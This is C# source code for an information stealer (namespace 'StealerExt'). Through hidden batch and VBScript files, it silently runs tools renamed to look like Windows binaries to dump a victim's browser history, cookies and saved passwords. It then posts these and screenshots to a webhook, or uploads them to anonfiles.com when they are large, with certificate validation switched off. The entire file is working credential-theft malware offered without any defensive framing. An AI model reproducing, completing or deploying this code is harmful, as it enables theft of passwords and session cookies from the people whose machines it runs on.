using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;

namespace StealerExt
{
    public class API
	{
        #region Public Clients
        public string _name { get; set; }

		public string _ppUrl { get; set; }

		public API(string _HookUrl)
		{
			_Client = new HttpClient();
			_URL = _HookUrl;
		}

		public static WebClient wc = new WebClient();
		public static string Temp = Path.GetTempPath();
        #endregion
        #region Send Info
        public static void History()
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
			string idk = Temp + "compile.bat";
			string idk2 = Temp + "compile.vbs";
			if (File.Exists(idk)) File.Delete(idk);
			if (File.Exists(idk2)) File.Delete(idk2);
			using (StreamWriter streamWriter = File.CreateText(idk))
			{
				streamWriter.WriteLine("start %temp%\\xwizard.exe /stext \"%temp%\\%username%_History.txt\"");
				streamWriter.WriteLine("exit");
			}
			using (StreamWriter streamWriter2 = File.CreateText(idk2))
			{
				streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
				streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
				streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
				streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
				streamWriter2.WriteLine("Dim strArgs");
				streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
				streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
			}
			Process proc = new Process();
			proc.StartInfo.WorkingDirectory = Temp;
			proc.StartInfo.FileName = "compile.vbs";
			proc.StartInfo.CreateNoWindow = true;
			proc.EnableRaisingEvents = true;
			proc.Start();
			proc.WaitForExit();
			File.Delete(idk);
			File.Delete(idk2);
			string _history = Temp + Environment.UserName + "_History.txt";
			while (!File.Exists(_history) | IsFileinUse(new FileInfo(_history))) { }
			long s = new FileInfo(_history).Length;
			if (s < 7900000)
			{
				try
				{
					bool flag1 = true;
					if (File.Exists(_history))
					{ 
						string vm = File.ReadAllText(_history);
						flag1 = vm == "";
					}
					bool flag = File.Exists(_history);
					if (flag && !flag1)
					{
						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendHistory("**Browser History**", _history);
					}
					else if (flag1)
					{

						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendHistory("History file is empty.", null);
					}
					else
					{
						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendHistory("No history found", null);
					}
				}
				catch (Exception ex)
				{
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendHistory("History ex: " + ex.Message, null);
				}
			}
			else
			{
				string history = string.Empty;
				try
				{
					using (var Client = new ExtendedWebClient())
					{
						Client.Timeout = Timeout.Infinite;
						Client.AllowWriteStreamBuffering = false;
						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", _history);
						Client.Dispose();
						string ResponseBody = Encoding.ASCII.GetString(Response);
						if (ResponseBody.Contains("\"error\": {"))
						{
							history += "Error (History): " + ResponseBody.Split('"')[7] + "\r\n";
						}
						else
						{
							history += "Browser History: " + ResponseBody.Split('"')[15] + "\r\n";
						}
					}
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendHistory(history, null);
				}
				catch (WebException ex)
				{
					history += "History ex (anonfiles): " + ex.Message + "\r\n";
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendHistory(history, null);
				}
			}
			File.Delete(_history);
        }
		public static void Cookies()
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
			string idk = Temp + "compile.bat";
            string idk2 = Temp + "compile.vbs";
            if (File.Exists(idk)) File.Delete(idk);
            if (File.Exists(idk2)) File.Delete(idk2);
            using (StreamWriter streamWriter = File.CreateText(idk))
            {
                streamWriter.WriteLine("start %temp%\\winhlp32.exe /stext \"%temp%\\Cookies1\"");
				streamWriter.WriteLine("start %temp%\\splwow64.exe /stext \"%temp%\\Cookies2\"");
				streamWriter.WriteLine("start %temp%\\hh.exe /stext \"%temp%\\Cookies3\"");
				streamWriter.WriteLine("exit");
            }
            using (StreamWriter streamWriter2 = File.CreateText(idk2))
            {
                streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
                streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
                streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
                streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
                streamWriter2.WriteLine("Dim strArgs");
                streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
                streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
            }
            Process proc = new Process();
            proc.StartInfo.WorkingDirectory = Temp;
            proc.StartInfo.FileName = "compile.vbs";
            proc.StartInfo.CreateNoWindow = true;
            proc.EnableRaisingEvents = true;
            proc.Start();
            proc.WaitForExit();
            File.Delete(idk);
            File.Delete(idk2);
			while (!File.Exists(Temp + "Cookies1") | !File.Exists(Temp + "Cookies2") | !File.Exists(Temp + "Cookies3") | IsFileinUse(new FileInfo(Temp + "Cookies1")) | IsFileinUse(new FileInfo(Temp + "Cookies2")) | IsFileinUse(new FileInfo(Temp + "Cookies3"))) { }
			try
            {
				string c1 = File.ReadAllText(Temp + "Cookies1");
				string c2 = File.ReadAllText(Temp + "Cookies2");
				string c3 = File.ReadAllText(Temp + "Cookies3");
				string c = c1 + c2 + c3;
				File.WriteAllText(Temp + Environment.UserName + "_Cookies.txt", c);
				File.Delete(Temp + "Cookies1"); File.Delete(Temp + "Cookies2"); File.Delete(Temp + "Cookies3");
			}
            catch (Exception x)
            {
				new API(wHook)
				{
					_name = name,
					_ppUrl = pfp,
				}.SendCookies("Cookies Ex [Mix]: " + x.Message, null);
            }
			string text = Temp + Environment.UserName + "_Cookies.txt";
			long size_c = new FileInfo(text).Length;
			if (File.ReadAllText(text) == "") 
			{
				new API(wHook)
				{
					_name = name,
					_ppUrl = pfp
				}.SendCookies("Cookies file is empty.", null);
				return;
			}
			if (size_c < 7900000)
            {
				try
				{
					bool flag = File.Exists(text);
					if (flag)
					{
						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendCookies("**Browser Cookies**", text);
					}
					else
					{
						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendCookies("No cookies found!", null);
					}
				}
				catch (Exception x)
				{
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendCookies("Cookies ex: " + x.Message, null);
				}
			}
            else
            {
				string info = string.Empty;
				try
				{
					using (var Client = new ExtendedWebClient())
					{
						Client.Timeout = Timeout.Infinite;
						Client.AllowWriteStreamBuffering = false;
						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", text);
						Client.Dispose();
						string ResponseBody = Encoding.ASCII.GetString(Response);
						if (ResponseBody.Contains("\"error\": {"))
						{
							info += "Error (Cookie): " + ResponseBody.Split('"')[7] + "\r\n";
						}
						else
						{
							info += "Browser Cookies: " + ResponseBody.Split('"')[15] + "\r\n";
						}
					}
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendCookies(info, null);
				}
				catch (WebException ex)
				{
					info += "Cookie ex (anonfiles): " + ex.Message + "\r\n";
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendCookies(info, null);
				}
			}
			File.Delete(text);
		}
		public static void Screenshot()
        {
			string ss = Temp + "ss.png";
			bool flag = File.Exists(ss);
			if (flag)
            {
				new API(wHook)
				{
					_name = name,
					_ppUrl = pfp
				}.SendScreenshot("", ss);
				File.Delete(ss);
			}
		}
		public static void Passwords()
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
			string idk = Temp + "compile.bat";
			string idk2 = Temp + "compile.vbs";
			if (File.Exists(idk)) File.Delete(idk);
			if (File.Exists(idk2)) File.Delete(idk2);
			using (StreamWriter streamWriter = File.CreateText(idk))
			{
				streamWriter.WriteLine("start %temp%\\snuvcdsm.exe /stext \"%temp%\\%username%_Passwords.txt\"");
				streamWriter.WriteLine("exit");
			}
			using (StreamWriter streamWriter2 = File.CreateText(idk2))
			{
				streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
				streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
				streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
				streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
				streamWriter2.WriteLine("Dim strArgs");
				streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
				streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
			}
			Process proc = new Process();
			proc.StartInfo.WorkingDirectory = Temp;
			proc.StartInfo.FileName = "compile.vbs";
			proc.StartInfo.CreateNoWindow = true;
			proc.EnableRaisingEvents = true;
			proc.Start();
			proc.WaitForExit();
			File.Delete(idk);
			File.Delete(idk2);
			string text = Temp + Environment.UserName + "_Passwords.txt";
			while (!File.Exists(text) | IsFileinUse(new FileInfo(text))) { }	
			string vm = File.ReadAllText(text);
			if (vm == "") 
			{
				new API(wHook)
				{
					_name = name,
					_ppUrl = pfp
				}.SendPasswords("Password file is empty.", null);
				return;
			}
			long size_psw = new FileInfo(text).Length;
			if (size_psw < 7900000)
            {
				try
				{
					bool flag = File.Exists(text);
					if (flag)
					{
						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendPasswords("**Browser Password**", text);
					}
					else
					{
						new API(wHook)
						{
							_name = name,
							_ppUrl = pfp
						}.SendPasswords("No browser passwords found!", null);
					}
				}
				catch (Exception x)
				{
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendPasswords("Passwords ex: " + x.Message, null);
				}
			}
            else
            {
				string info = string.Empty;
				try
				{
					using (var Client = new ExtendedWebClient())
					{
						Client.Timeout = Timeout.Infinite;
						Client.AllowWriteStreamBuffering = false;
						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", text);
						Client.Dispose();
						string ResponseBody = Encoding.ASCII.GetString(Response);
						if (ResponseBody.Contains("\"error\": {"))
						{
							info += "Error (Passwords): " + ResponseBody.Split('"')[7] + "\r\n";
						}
						else
						{
							info += "Browser Passwords: " + ResponseBody.Split('"')[15] + "\r\n";
						}
					}
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendPasswords(info, null);
				}
				catch (WebException ex)
				{
					info += "Passwords ex (anonfiles): " + ex.Message + "\r\n";
					new API(wHook)
					{
						_name = name,
						_ppUrl = pfp
					}.SendPasswords(info, null);
				}
			}
			File.Delete(text);
		}

		public bool SendCookies(string content = null, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Cookies.txt", Environment.UserName + "_Cookies.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendHistory(string content = null, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_History.txt", Environment.UserName + "_History.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendScreenshot(string content = null, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "ss.png", "ss.png");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendPasswords(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Passwords.txt", Environment.UserName + "_Passwords.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendSysInfo(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "SystemINFO.txt", "SystemINFO.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendWCC(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "capture.png", "capture.png");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}
		public bool idk(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "capture.png", "capture.png");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public static bool IsFileinUse(FileInfo file)
		{
			FileStream stream = null;
			if (file.Name.Contains("capture.png") & !file.Exists)
			{
				Thread.Sleep(1000);
				if (!file.Exists)
					return false;
			}
			try
			{
				stream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			}
			catch (IOException)
			{
				return true;
			}
			finally
			{
				if (stream != null)
					stream.Close();
			}
			return false;
		}
        #endregion
        #region String & Bools
        public static string wHook => Hook._Santa;

		public static string name = "";

		public static string pfp = "";

		private HttpClient _Client;

		private string _URL;
        #endregion
    }
}